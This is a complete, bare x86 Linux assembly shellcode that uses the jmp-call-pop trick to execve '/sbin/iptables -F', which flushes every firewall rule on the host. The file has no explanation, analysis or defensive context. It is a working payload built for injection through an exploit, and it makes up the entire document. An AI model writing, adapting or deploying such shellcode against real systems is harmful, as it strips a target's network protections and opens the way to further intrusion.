global _start

section .text

_start:
	jmp short get
code:
	pop ebx
	cdq
	mov [ebx+0xe], dl
	
	lea eax, [ebx+0xf]
	push edx
	push eax
	push ebx
	mov ecx, esp

	mov eax, edx
	mov al, 0xb
	int 0x80
get:
	call code
	file: db "/sbin/iptables#-F"
